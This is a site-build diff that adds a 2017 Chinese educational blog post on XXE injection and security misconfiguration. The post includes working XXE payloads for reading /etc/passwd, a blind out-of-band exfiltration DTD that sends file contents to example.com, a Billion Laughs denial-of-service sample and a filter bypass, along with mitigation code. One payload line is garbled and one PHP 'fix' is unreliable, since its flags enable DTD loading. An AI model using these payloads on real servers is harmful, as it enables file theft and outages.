@@ -6,17 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://zhongjiahua.github.io">
-  <title>Tag: 前端 | 墨锋科技</title>
+  <title>常见网络安全漏洞（2） | 墨锋科技</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="墨锋科技 技术 墨锋 科技 开发 软件">
-<meta property="og:type" content="website">
-<meta property="og:title" content="墨锋科技">
-<meta property="og:url" content="http://zhongjiahua.github.io/tags/前端/index.html">
+  <meta name="description" content="4. XXE攻击 Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, i">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见网络安全漏洞（2）">
+<meta property="og:url" content="http://zhongjiahua.github.io/2017/11/19/常见网络安全漏洞（2）/index.html">
 <meta property="og:site_name" content="墨锋科技">
-<meta property="og:description" content="墨锋科技 技术 墨锋 科技 开发 软件">
+<meta property="og:description" content="4. XXE攻击 Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, i">
+<meta property="og:updated_time" content="2017-11-26T10:11:15.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="墨锋科技">
-<meta name="twitter:description" content="墨锋科技 技术 墨锋 科技 开发 软件">
+<meta name="twitter:title" content="常见网络安全漏洞（2）">
+<meta name="twitter:description" content="4. XXE攻击 Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, i">
   
     <link rel="alternative" href="/atom.xml" title="墨锋科技" type="application/atom+xml">
   
@@ -152,181 +154,410 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-常见网络安全漏洞（2）" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      常见网络安全漏洞（2）
+    </h1>
+  
+
+        
+        <a href="/2017/11/19/常见网络安全漏洞（2）/" class="archive-article-date">
+  	<time datetime="2017-11-18T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-19</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="4-XXE攻击"><a href="#4-XXE攻击" class="headerlink" title="4. XXE攻击"></a>4. XXE攻击</h4><blockquote>
+<p>Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks, such as the Billion Laughs attack.</p>
+</blockquote>
+<p>XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。主要是针对使用XML交互的Web应用程序的攻击方法。</p>
+<p>可扩展标记语言（eXtensible Markup Language，XML）是一种标记语言，被设计用来传输和存储数据。XML应用极其广泛，如：</p>
+<ul>
+<li>普通列表项目文档格式：OOXML，ODF，PDF，RSS……</li>
+<li>图片格式：SVG，EXIF Headers……</li>
+<li>网络协议：WebDAV，CalDAV，XMLRPC，SOAP，REST，XMPP，SAML，XACML……</li>
+<li>配置文件：Spring配置文件，Struts2配置文件……</li>
+</ul>
+<p>在XML 1.0标准中定义了实体的概念，实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。</p>
+<p>包含内部实体的XML文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY copyright "Copyright wiki.wooyun.org"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">internal</span>&gt;</span>&amp;copyright;<span class="tag">&lt;/<span class="name">internal</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>包含外部实体的XML文档：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"></div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY wiki SYSTEM "http://wiki.wooyun.org/"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;wiki;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在解析XML时，实体将会被替换成相应的引用内容。</p>
+<p>XML外部实体（XML External Entity，XXE）攻击是一种常见的Web安全漏洞，攻击者可以通过XML的外部实体获取服务器中本应被保护的数据。</p>
+<h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><p>XML解析器解析外部实体时支持多种协议：</p>
+<table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>——–</td>
+<td>—————-</td>
+<td>——–</td>
+<td>——–</td>
+</tr>
+<tr>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>https</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td>gopher</td>
+</tr>
+</tbody>
+</table>
+<p>如使用file协议可以读取本地文件内容、使用http协议可以获取Web资源等，因此攻击者可构造恶意的外部实体，当解析器解析了包含“恶意”外部实体的XML类型文件时，便会导致被XXE攻击。</p>
+<p>下面这个XML被解析时便会将本地<code>/etc/passwd</code>文件的内容读出来：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p><em>注：如果读取的文件本身包含“&lt;”、“&amp;”等字符时会产生失败的情况，对于此类文件可以使用Base64编码绕过，具体方法如下：</em></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY file SYSTEM ENTITY e SYSTEM "php://filter/read=convert.base64-encode/resource=http://wiki.wooyun.org"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">external</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">external</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>不同的解析器可能默认对于外部实体会有不同的处理规则,以PHP语言为例，xml_parse的实现方式为expat库，而simplexml_load使用的是libxml库，两个底层库在解析的时候细节并不一样，expat默认对外部实体并不解析，而simplexml_load默认情况下会解析外部实体等，所以simplexml_load函数会受此问题影响，而xml_parse则默认不会受到影响。下面是几种常见语言可能会受到此问题影响的解析XML的方法：</p>
+<table>
+<thead>
+<tr>
+<th>PHP</th>
+<th>Java</th>
+<th>.NET</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>————</td>
+<td>—————-</td>
+<td>————————</td>
+</tr>
+<tr>
+<td>DOM</td>
+<td>（待补充）</td>
+<td>System.Xml.XmlDocument</td>
+</tr>
+<tr>
+<td>SimpleXML</td>
+<td></td>
+<td>System.Xml.XmlReader</td>
+</tr>
+</tbody>
+</table>
+<p>XXE的攻击方式分为显式攻击和盲攻击两种：</p>
+<p>上述POC即为显式攻击，攻击者通过正常的回显将外部实体里的内容读取出来。</p>
+<p>但是，在有些情况下无法通过这种方式完成XXE攻击，这时我们可以采取盲攻击的办法。</p>
+<p>XXE盲攻击利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache日志）中读出文件的内容。</p>
+<p>因在dtd中使用%来定义参数实体的方式只能在外部子集中使用，或由外部文件定义参数实体，引用到XML文件的dtd来使用，所以XML文件稍有不同：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [</span></div><div class="line"><span class="meta">  &lt;!ENTITY % call SYSTEM "http://example.com/evil.xml"&gt;</span></div><div class="line"><span class="meta">  %call;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">text</span>&gt;</span>test<span class="tag">&lt;/<span class="name">text</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>其中<code>http://example.com/evil.xml</code>里的内容是：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></div><div class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://example.com/?file=%file;'&gt;"&gt;</div><div class="line">%int;</div><div class="line">%send;</div></pre></td></tr></table></figure>
+<h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><p>XXE漏洞会导致读取任意未授权文件，如上述POC即可读取服务器中的<code>/etc/passwd</code>文件；</p>
+<p>因为基于树的XML解析器会把全部加载到内存中，因此XXE漏洞也有可能被用来恶意消耗内存进行拒绝服务攻击，例如:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version = "1.0"?&gt;</div><div class="line"> </div><div class="line"><span class="meta">&lt;!DOCTYPE entity [  </span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun "wooyun"&gt;</span></div><div class="line"><span class="meta">    &lt;!ELEMENT wooyunz (#PCDATA)&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun1 "&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;&amp;wooyun;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun2 "&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;&amp;wooyun1;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun3 "&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;&amp;wooyun2;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun4 "&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;&amp;wooyun3;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun5 "&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;&amp;wooyun4;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun6 "&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;&amp;wooyun5;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun7 "&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;&amp;wooyun6;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun8 "&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;&amp;wooyun7;"&gt;</span></div><div class="line"><span class="meta">    &lt;!ENTITY wooyun9 "&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;&amp;wooyun8;"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"> </div><div class="line"><span class="tag">&lt;<span class="name">wooyun</span>&gt;</span>&amp;wooyun9;<span class="tag">&lt;/<span class="name">wooyun</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>这个XML在定义实体是不断嵌套调用，如解析时未对大小进行限制，则可能会导致内存大量被消耗，从而实现拒绝服务攻击。</p>
+<p>此外，还可以利用支持的协议构造出很多相关的攻击，如探测内网信息（如检测服务等）等。</p>
+<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><ol>
+<li>SVG本身是基于XML的，该漏洞在SVG转成JPG图片时的XML解析过程中厂商仅直接过滤了<code>ENTITY</code>关键字，但是由于DTD本身就支持调用外部的DTD文件，因此通过调用<code>&lt;!DOCTYPE svg SYSTEM “http://example.com/xxe.dtd”&gt;</code>的方式引入外部的DTD文件即成功避开了对<code>ENTITY</code>关键字的过滤，其中<code>xxe.dtd</code>的内容如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li>利用参数实体实现了XXE盲攻击，在读取本地文件后，将读出本地文件的内容作为URL中的参数向其指定服务器发起请求，在指定服务器的Apache日志中即可看到读出的文件内容。</li>
+<li>在格式化xml时进行了解析且没有对外部实体进行限制，因此产生服务器上任意文件被读取的问题，从而导致主站的ssh用户名和密码泄露，被成功getshell。</li>
+</ol>
+<h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><p>在默认情况下关闭内联DTD解析（Inline DTD parsing）、外部实体、实体，使用白名单来控制允许实用的协议。</p>
+<p>了解所使用的XML解析器是否默认解析外部实体，如果默认解析应根据实际情况进行关闭或者限制。下面给出了一些常见的关闭方法：</p>
+<p>PHP：</p>
+<p>对于使用SimpleXML解析XML的方法可在加载实体之前添加<code>libxml*disable*entity_loader(true);</code>语句以进制解析外部实体。</p>
+<p>对于使用DOM解析XML的方法可在加载实体之前添加<code>libxml*disable*entity_loader(true);</code>语句或者使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// with the DOM functionality:</span></div><div class="line">$dom = <span class="keyword">new</span> DOMDocument();</div><div class="line">$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>对于XMLReader解析XML的方法可使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// with the XMLReader functionality:</span></div><div class="line">$doc = XMLReader::xml($badXml,<span class="string">'UTF-8'</span>,LIBXML_NONET);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>Java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</div></pre></td></tr></table></figure>
+<p>.Net：</p>
+<p>对于使用System.Xml.XmlReader解析XML的方法：</p>
+<p>默认情况下，外部资源使用没有用户凭据的XmlUrlResolver对象进行解析。这意味着在默认情况下，可以访问任何不需要凭据的位置。通过执行下列操作之一，可以进一步保证安全：</p>
+<ul>
+<li>通过将XmlReaderSettings.XmlResolver属性设置为XmlSecureResolver对象限制XmlReader可访问的资源。</li>
+<li>通过将XmlReaderSettings.XmlResolver属性设置为null，不允许XmlReader打开任何外部资源。</li>
+</ul>
+<p>对于利用超大的XML文档进行拒绝服务攻击的问题，使用XmlReader时，通过设置MaxCharactersInDocument属性，可以限制能够分析的文档大小。通过设置MaxCharactersFromEntities属性，可以限制从扩展实体中生成的字符数。</p>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</div></pre></td></tr></table></figure>
+<h5 id="漏洞扫描与发现"><a href="#漏洞扫描与发现" class="headerlink" title="漏洞扫描与发现"></a>漏洞扫描与发现</h5><p>检测XML是否被解析</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="meta">	&lt;!ENTITY xxe "xxe test"&gt;</span></div><div class="line"><span class="meta">]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>如果显示了xxe test证明支持，进行第二步</p>
+<p>是否支持外部实体:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></div><div class="line"><span class="meta">	&lt;!ENTITY % xxe SYSTEM "http://192.168.5.1/xxe.xml"&gt;</span></div><div class="line"><span class="meta">%xxe;</span></div><div class="line"><span class="meta">]&gt;</span></div></pre></td></tr></table></figure>
+<p>观察自己的服务器上得access.log，如果有xxe.xml的请求，证明可以加载外部实体。</p>
+<h4 id="5-安全配置错误"><a href="#5-安全配置错误" class="headerlink" title="5. 安全配置错误"></a>5. 安全配置错误</h4><blockquote>
+<p>Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, in-complete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must also be patched/upgraded in a timely fashion.</p>
+</blockquote>
+<p>安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、框架和自定义代码。开发人员和系统管理员需共同努力，以确保整个堆栈的正确配置。自动扫描器可用于检测未安装的补丁、错误的配置、默认帐户的使用、不必要的服务等。</p>
+<h5 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h5><ol>
+<li>应用程序服务器管理员控制台自动安装后没有被删除。而默认帐户也没有被改变。攻击者在你的服务器上发现了标准的管理员页面，通过默认密码登录，从而接管了你的服务器。</li>
+<li>目录列表在你的服务器上未被禁用。攻击者发现只需列出目录，她就可以找到你服务器上的任意文件。攻击者找到并下载所有已编译的Java类，她通过反编译获得了所有你的自定义代码。然后，她在你的应用程序中找到一个访问控制的严重漏洞。</li>
+<li>应用服务器配置允许堆栈跟踪返回给用户，这样就暴露了潜在的漏洞。攻击者热衷于收集错误消息里提供的额外信息。</li>
+<li>应用服务器自带的示例应用程序没有从你的生产服务器中删除。该示例应用有已知安全漏洞，攻击者可以利用这些漏洞破坏你的服务器。</li>
+</ol>
+<h4 id="附上OWASP的十大安全隐患应对工具"><a href="#附上OWASP的十大安全隐患应对工具" class="headerlink" title="附上OWASP的十大安全隐患应对工具"></a>附上OWASP的十大安全隐患应对工具</h4><table>
+<thead>
+<tr>
+<th><strong>安全风险</strong></th>
+<th><strong>应对工具</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>第一位: 注入式风险</strong></td>
+<td><strong>SQL Inject Me</strong></td>
+</tr>
+<tr>
+<td><strong>第二位: 跨站点脚本 (简称XSS)</strong></td>
+<td><strong>ZAP</strong></td>
+</tr>
+<tr>
+<td><strong>第三位: 无效的认证及会话管理功能</strong></td>
+<td><strong>HackBar</strong></td>
+</tr>
+<tr>
+<td><strong>第四位: 对不安全对象的直接引用</strong></td>
+<td><strong>Burp</strong></td>
+</tr>
+<tr>
+<td><strong>第五位: 伪造的跨站点请求(简称CSRF)</strong></td>
+<td><strong>Tamper Data</strong></td>
+</tr>
+<tr>
+<td><strong>第六位: 安全配置错误</strong></td>
+<td><strong>Watobo</strong></td>
+</tr>
+<tr>
+<td><strong>第七位: 加密存储方面的不安全因素</strong></td>
+<td><strong>N/A</strong></td>
+</tr>
+<tr>
+<td><strong>第八位: 不限制访问者的URL</strong></td>
+<td><strong>Nikto/Wikto</strong></td>
+</tr>
+<tr>
+<td><strong>第九位: 传输层面的保护力度不足</strong></td>
+<td><strong>Calomel</strong></td>
+</tr>
+<tr>
+<td><strong>第十位: 未经验证的重新指向及转发</strong></td>
+<td><strong>Watcher</strong></td>
+</tr>
+</tbody>
+</table>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>随意打赏,爱给不给~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/zhifubao.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/WechatMoney.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/05/Node.js作为解决高并发请求的解决方案/" class="archive-article-date">
-  	<time datetime="2017-11-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/05/Node.js作为解决高并发请求的解决方案/">Node.js作为高并发请求的解决方案</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">框架</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/技术探索//" class="article-tag-list-link color5">技术探索</a>
+        			<a href="/categories/知识普及//" class="article-tag-list-link color5">知识普及</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://zhongjiahua.github.io/2017/11/19/常见网络安全漏洞（2）/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/10/29/mock.js实现前端独立开发/" class="archive-article-date">
-  	<time datetime="2017-10-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-29</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2017/11/19/常见网络安全漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">常见网络安全漏洞（1）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
